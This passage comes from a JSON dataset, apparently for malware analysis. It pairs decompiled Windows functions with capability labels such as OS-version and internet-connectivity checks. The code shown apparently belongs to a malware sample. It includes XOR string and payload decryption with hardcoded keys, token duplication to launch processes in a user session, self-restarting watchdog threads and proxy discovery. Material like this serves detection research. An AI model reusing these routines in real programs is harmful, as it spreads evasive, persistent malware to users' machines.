(*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar2 != 0xf597f8) {\n            var_50h = 6;\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % 6) ^ (iVar5 + iVar4)[&var_4ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpCommandLine, 0x104);\n    puVar6 = var_54h;\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_98h, var_54h);\n    if (puVar6[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(puVar6[1]);\n    }\n    uVar1 = *puVar6;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 1024
    },
    "0040ec98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040ec98(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint lpApplicationName;\n    uint lpCommandLine;\n    int32_t var_a8h;\n    uint var_84h;\n    uint var_80h;\n    uint var_64h;\n    uint var_60h;\n    int32_t *var_5ch;\n    uint var_58h;\n    int32_t ProcessHandle;\n    uint TokenHandle;\n    uint var_4ch;\n    uint pSessionId;\n    int32_t var_44h;\n    uint hExistingToken;\n    uint pSid;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint pIdentifierAuthority;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint hToken;\n    \n    var_14h._0_2_ = 0x1000;\n    piVar6 = param_2;\n    for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *piVar6 = 0;\n        piVar6 = piVar6 + 1;\n    }\n    puVar7 = &lpCommandLine;\n    var_5ch = param_2;\n    for (iVar4 = 0x44; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    pSessionId = 0;\n    puVar7 = &var_64h;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_4ch = 0;\n    hToken = 0;\n    hExistingToken = 0;\n    var_8h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    ProcessHandle = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (ProcessHandle != 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(ProcessHandle, 0x201eb, &hExistingToken);\n            if (iVar4 != 0) {\n                fcn.0040d1ad();\n                iVar4 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar1 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar4 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar5 = 0;\n                    iVar4 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar4 != 0) {\n                        var_60h = 0x20;\n                        var_64h = pSid;\n                        iVar4 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar1)(hToken, 0x19, &var_64h, iVar4 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_58h = 0;\n                    (*pcVar1)(hToken, 0x1b, &var_58h, 4);\n                    iVar4 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_8h, hToken, 1);\n                    if (iVar4 == 0) {\n                        var_8h = 0;\n                    }\n                    else {\n                        var_4ch = 0x400;\n                    }\n                    lpCommandLine = 0x44;\n                    var_38h = 0x7a2e7747;\n                    var_34h = 0x47043003;\n                    var_30h = 0x77516d0e;\n                    var_2ch = 0x30317a77;\n                    var_28h = 0x6d1f4713;\n                    var_24h = 0x7a267756;\n                    var_20h = 0x471b3018;\n                    var_1ch = 0x77306d0e;\n                    var_10h = 0x7a477730;\n                    var_ch._0_1_ = 0x6d;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x41);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    var_44h = &var_38h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                        if (iVar3 != 0xb364a) {\n                            var_44h = 5;\n                            *(iVar5 + iVar4) = *(&var_10h + iVar5 % 5) ^ (iVar5 + iVar4)[&var_38h - iVar4];\n                        }\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0x20);\n                    var_80h._0_2_ = 0;\n                    var_84h = 1;\n                    var_a8h = iVar4;\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpApplicationName, L\"%s --\", *0x41cb28);\n                    param_2 = var_5ch;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, &lpApplicationName, 0, 0, 0, 0, var_4ch, var_8h, 0, &lpCommandLine, var_5ch);\n                    pcVar8 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*param_2 != 0) {\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*param_2, 0x201eb, &TokenHandle);\n                        if (iVar5 != 0) {\n                            fcn.0040d1ad();\n                            (*pcVar8)(TokenHandle);\n                        }\n                        (*pcVar8)(param_2[1]);\n                    }\n                    if (var_8h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_8h);\n                    }\n                    (*pcVar8)(hToken);\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n                (*pcVar8)(hExistingToken);\n            }\n        }\n        (*pcVar8)(ProcessHandle);\n    }\n    return *param_2;\n}\n",
        "token_count": 1721
    },
    "0040ef3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040ef3d(uint *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint lpCommandLine;\n    uint var_44h;\n    \n    iVar2 = 0x44;\n    puVar3 = param_1;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_44h;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_44h = 0x44;\n    puVar3 = &lpCommandLine;\n    for (iVar1 = 0x208; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpCommandLine, L\"%s --\", *0x41cb28);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_44h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    return *param_1;\n}\n",
        "token_count": 361
    },
    "0040efba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040efba(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack580;\n    uint32_t uStack576;\n    uint uStack572;\n    uint32_t uStack568;\n    uint32_t uStack564;\n    int32_t iStack552;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack576 = 0;\n    iStack580 = 0;\n    puVar10 = auStack544;\n    for (iVar8 = 0x10; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puVar11 = &uStack568;\n    for (iVar8 = 0x18; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    piVar9 = &iStack528;\n    for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *piVar9 = 0;\n        piVar9 = piVar9 + 1;\n    }\n    if (*0x41cb34 == 0) {\n        *0x41cbc8 = fcn.0040eb2d();\n        uVar6 = *0x41cbc4;\n        iVar8 = *0x41cbc0;\n    }\n    else {\n        *0x41cbc8 = fcn.0040e802();\n        iVar5 = fcn.00403864(&iStack580);\n        uVar6 = uStack576;\n        iVar8 = iStack580;\n        if (iVar5 != 0) goto code_r0x0040f073;\n    }\n    uStack564 = uVar6 >> 0x1f;\n    uStack568 = uVar6;\n    iStack552 = iVar8;\ncode_r0x0040f073:\n    iVar8 = iStack552;\n    uVar3 = uStack564;\n    uVar6 = uStack568;\n    if (*0x41cbc8 == 0) {\n        piVar9 = &iStack528;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        if (piVar9 - auStack526 >> 1 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar4);\n        }\n    }\n    else {\n        fcn.0040cbc9();\n        if ((iVar8 != 0) && ((uVar6 | uVar3) != 0)) {\n            fcn.0040fa9d();\n            fcn.00402871((*0x41cb1c & 1) << 4);\n        }\n        uStack576 = *0x41cbc8;\n        uStack572 = *0x41cb24;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack576, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41cbc8, 0);\n        uVar7 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040efba, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n        (*pcVar2)(*0x41cbc8);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 957
    },
    "0040f14a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f14a(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uchar *puStack572;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    puVar7 = &stack0xfffffde0;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &stack0xfffffdf0;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x41cb34 == 0) {\n        puStack572 = 0x40f191;\n        *0x41cbc8 = fcn.0040ef3d();\n    }\n    else {\n        puStack572 = 0x40f186;\n        *0x41cbc8 = fcn.0040ec98();\n    }\n    if (*0x41cbc8 == 0) {\n        piVar6 = &stack0xfffffdf0;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - &stack0xfffffdf2 >> 1 != 0) {\n            puStack572 = &stack0xfffffdf0;\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)();\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        puStack572 = 0x40f1a5;\n        fcn.0040cbc9();\n        iStack552 = *0x41cbc8;\n        puStack572 = 0xffffffff;\n        uStack548 = *0x41cb24;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &stack0xfffffdd8, 0);\n        puStack572 = NULL;\n        (*_sym.imp.KERNEL32.dll_GetExitCodeProcess)(*0x41cbc8, &stack0xfffffdc4);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41cbc8, 0);\n        uVar4 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f14a, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        (*pcVar2)(*0x41cbc8);\n    }\n    puStack572 = NULL;\n    (*_sym.imp.KERNEL32.dll_ExitThread)();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 730
    },
    "0040f250": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f250(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uint var_30ch;\n    uint var_104h;\n    \n    puVar5 = &var_104h;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    puVar5 = &var_30ch;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if (*0x41cb34 == 0) {\n        uVar3 = 0;\n        while (*(uVar3 + 0x410900) != arg_ch) {\n            uVar3 = uVar3 + 4;\n            if (0x2b < uVar3) {\n                return 1;\n            }\n        }\n        if (arg_10h == *0x41cb30) {\n            return 1;\n        }\n        if (arg_ch == -0x37b0bf10) {\n            puVar5 = &var_104h;\n            for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            var_104h._0_1_ = 0;\n            if ((arg_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar4 != 0)) {\n                (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar4, &var_104h, 0x104);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            pcVar6 = _sym.imp.KERNEL32.dll_lstrlenA;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_104h);\n            if (iVar4 != 0) {\n                (*pcVar6)(&var_104h);\n                iVar4 = fcn.0040aeb9();\n                if (iVar4 == -0x37b0bf10) {\n                    return 1;\n                }\n            }\n        }\n        iVar4 = fcn.0040ce1b();\n        if (iVar4 != 0) {\n            return 1;\n        }\n        puVar5 = &var_30ch;\n        for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        iVar4 = fcn.0040cbc9();\n        if (iVar4 == 0) {\n            return 1;\n        }\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_30ch, 0x41cbd0);\n        if (iVar4 != 0) {\n            return 1;\n        }\n        pcVar6 = fcn.0040d0d5;\n    }\n    else {\n        if (arg_ch != 0x74fc6984) {\n            return 1;\n        }\n        iVar4 = fcn.0040ce1b();\n        if (iVar4 != 0) {\n            return 1;\n        }\n        iVar4 = fcn.0040cbc9();\n        if (iVar4 == 0) {\n            return 1;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_30ch);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(&var_30ch);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        *(iVar4 + 8) = arg_10h;\n        pcVar6 = fcn.0040f14a;\n        arg_10h = iVar4;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, pcVar6, arg_10h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    return 1;\n}\n",
        "token_count": 1068
    },
    "0040f5d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040f5d0(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41cb34 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41cb24, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41cbd0;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.0040cbc9();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040efba, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x412490) = *(uVar5 + 0x412490) ^ \"XbAtXhRUKArkYmp\"[uVar5 % 0xf];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x416890) = *(uVar5 + 0x416890) ^ str.bIG0iEw66qDxFMQFU_[uVar5 % 0xc];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040f40a, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41cb18 == 0) {\n        fcn.004073b8();\n        if (*0x41cb34 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 683
    },
    "0040f746": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040f746(uint param_1, uchar *param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint pszFile;\n    int32_t var_54h;\n    int32_t pProxyConfig;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint32_t pszSrch;\n    int32_t var_3ch;\n    uchar *psz1;\n    uint32_t pAutoProxyOptions;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uchar uStack44;\n    uint var_27h;\n    uint var_23h;\n    uchar var_1fh;\n    ushort uStack34;\n    int32_t lpcwszUrl;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint pProxyInfo;\n    int32_t psz2;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    puVar9 = &pProxyConfig;\n    psz1 = param_2;\n    for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &pszFile;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *param_2 = 0;\n        param_2 = param_2 + 1;\n    }\n    iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpGetIEProxyConfigForCurrentUser)(&pProxyConfig);\n    if ((iVar6 != 0) && (iVar6 = fcn.0040f6f2(),  iVar6 != 0)) {\n        uVar8 = 1;\n        if (((pProxyConfig != 0) || (var_4ch != 0)) &&\n           (iVar6 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(0, 1, 0, 0, 0),  iVar6 != 0)) {\n            bVar10 = pProxyConfig != 0;\n            var_2ch = 0;\n            _uStack44 = 0;\n            stack0xffffffd8 = 0;\n            var_30h = bVar10;\n            pAutoProxyOptions = bVar10;\n            if (var_4ch != 0) {\n                pAutoProxyOptions = bVar10 | 2;\n                var_2ch = var_4ch;\n            }\n            var_23h._3_1_ = 1;\n            var_1fh = 0;\n            uStack34 = 0;\n            puVar9 = &pProxyInfo;\n            for (iVar7 = 4; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpGetProxyForUrl)(iVar6, lpcwszUrl, &pAutoProxyOptions, &pProxyInfo);\n            if ((iVar7 != 0) && (psz2 != 0)) {\n                (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, psz2);\n                (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n                pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n                if (psz2 != 0) {\n                    (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n                }\n                if (var_4h != 0) {\n                    (*pcVar1)(var_4h);\n                }\n                goto code_r0x0040fa41;\n            }\n            (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n            if (psz2 != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(psz2);\n            }\n            if (var_4h != 0) {\n                (*pcVar1)(var_4h);\n            }\n        }\n        if (var_48h != 0) {\n            if (var_44h == 0) {\ncode_r0x0040f8bc:\n                iVar6 = var_48h;\n                iVar7 = fcn.00404965();\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar7 == 0) {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar6);\n                    goto code_r0x0040fa41;\n                }\n                var_54h = 5;\n                var_2ch = 0x431f4405;\n                _uStack44 = 0x441d531c;\n                stack0xffffffd8 = 0x53524318;\n                var_23h._3_1_ = 0x6d;\n                var_1fh = 0x44;\n                psz2 = 0x436b446d;\n                var_4h = CONCAT22(var_4h._2_2_, 0x5368);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                var_10h = 0;\n                var_3ch = &var_2ch - iVar6;\n                pszSrch = iVar6;\n                do {\n                    iVar7 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n                    if (iVar7 != 0x3068a2) {\n                        var_18h = 6;\n                        *(var_10h + iVar6) = *(&psz2 + var_10h % 6) ^ (var_10h + iVar6)[var_3ch];\n                    }\n                    var_10h = var_10h + 1;\n                } while (var_10h < 0xe);\n                pProxyInfo = 0x47265459;\n                psz2 = 0x52243116;\n                var_4h = 0x54316234;\n                var_18h = 0x47525431;\n                var_14h._0_1_ = 0x62;\n                uVar8 = (*pcVar1)(8, 0x19);\n                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                iVar7 = 0;\n                var_3ch = &pProxyInfo - iVar6;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                    iVar3 = pszSrch;\n                    if (iVar4 != 0x525fa1) {\n                        *(iVar7 + iVar6) = *(&var_18h + iVar7 % var_54h) ^ (iVar7 + iVar6)[&pProxyInfo - iVar6];\n                    }\n                    iVar7 = iVar7 + 1;\n                } while (iVar7 < 0xc);\n                iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, pszSrch);\n                pszSrch = iVar7 == lpcwszUrl;\n                var_10h = 0;\n                lpcwszUrl = fcn.0040498b(&var_10h);\n                uVar8 = 1;\n                while (pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap,  lpcwszUrl != 0) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(lpcwszUrl, iVar6);\n                    if ((pszSrch == (iVar7 == lpcwszUrl)) && (iVar7 = fcn.00404965(),  iVar7 != 0)) {\n                        (*_sym.imp.SHLWAPI.dll_StrCpyW)(psz1, iVar7 + 2);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*pcVar1)(uVar5);\n                        goto code_r0x0040fa41;\n                    }\n                    lpcwszUrl = fcn.0040498b(&var_10h);\n                }\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar1)(0, iVar3);\n                (*pcVar2)(uVar8);\n            }\n            else {\n                do {\n                    iVar6 = fcn.0040498b(&var_10h);\n                    if (iVar6 == 0) goto code_r0x0040f8bc;\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_PathMatchSpecW)(&pszFile, iVar6);\n                } while (iVar6 == 0);\n            }\n        }\n    }\n    uVar8 = 0;\ncode_r0x0040fa41:\n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n    if (var_4ch != 0) {\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(var_4ch);\n    }\n    if (var_48h != 0) {\n        (*pcVar1)(var_48h);\n    }\n    if (var_44h != 0) {\n        (*pcVar1)(var_44h);\n    }\n    return uVar8;\n}\n",
        "token_count": 2294
    },
    "0040fa9d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
